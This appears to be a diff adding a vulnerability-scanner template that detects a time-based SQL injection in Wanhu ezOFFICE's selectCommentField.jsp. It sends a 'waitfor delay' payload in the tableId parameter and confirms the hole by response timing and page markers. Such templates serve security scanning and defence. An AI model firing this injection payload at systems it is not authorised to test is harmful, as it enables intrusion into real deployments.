@@ -1,0 +1,35 @@
+id: poc-yaml-wanhu-ezoffice-selectcommentfield-sqli
+info:
+  name: 万户 ezOFFICE selectCommentField SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  metadata:
+    product: 万户OA ezoffice
+
+variables:
+  t1: "{{rand_int(5,10)}}"
+  t2: "{{to_number(t1) + 3}}"
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/defaultroot/platform/custom/custom_database/dropdownselect/selectCommentField.jsp;.js?tableId=1;waitfor+delay+'0:0:{{t1}}'--+-"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "setSelectObj"
+          - "class=\"selectlist\""
+      - type: word
+        part: header
+        words:
+          - "Path=/defaultroot"
+      - type: dsl
+        dsl:
+          - "duration > to_number(t1)"
+          - "duration < to_number(t2)"
